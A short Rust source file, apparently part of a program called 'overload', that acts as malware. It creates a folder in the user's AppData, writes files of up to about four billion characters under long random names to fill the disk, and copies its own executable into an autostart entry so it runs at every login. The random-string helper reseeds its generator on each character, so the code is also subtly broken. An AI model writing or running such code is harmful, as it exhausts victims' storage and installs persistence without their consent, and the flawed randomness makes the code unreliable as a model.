use auto_launch::AutoLaunch;
use rand::{Rng, SeedableRng, rngs::SmallRng};
use std::{
    env,
    fs::{copy, create_dir_all, write},
};

pub fn join_paths(f: &str, s: &str) -> String {
    format!(r#"{}\{}"#, f, s)
}

fn random_string(length: usize) -> String {
    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789~@#$%^-_(){}'`";

    println!("Creating string: {length}");

    (0..length)
        .map(|_| {
            let idx = {
                let mut rng = SmallRng::seed_from_u64(1);
                rng.random_range(0..CHARSET.len())
            };
            CHARSET[idx] as char
        })
        .collect()
}

pub fn random_file() {
    const MAX_PATH_LENGTH: usize = 255;
    const MAX_TEXT_LENGTH: usize = 4294967295;

    let dir = join_paths(&env::var("appdata").expect(""), "overload");
    create_dir_all(&dir).expect("Failed create dir");

    let dir = join_paths(&dir, &random_string(MAX_PATH_LENGTH));
    let body: String = random_string(MAX_TEXT_LENGTH);
    write(dir, body).expect("Failed to write body");
}

pub fn self_copy(file_dir: &str) {
    copy("overload.exe", file_dir).expect("Failed to copy");

    let auto = AutoLaunch::new("overload", file_dir, &["-c"]);
    auto.enable().expect("Failed to autostart");
}
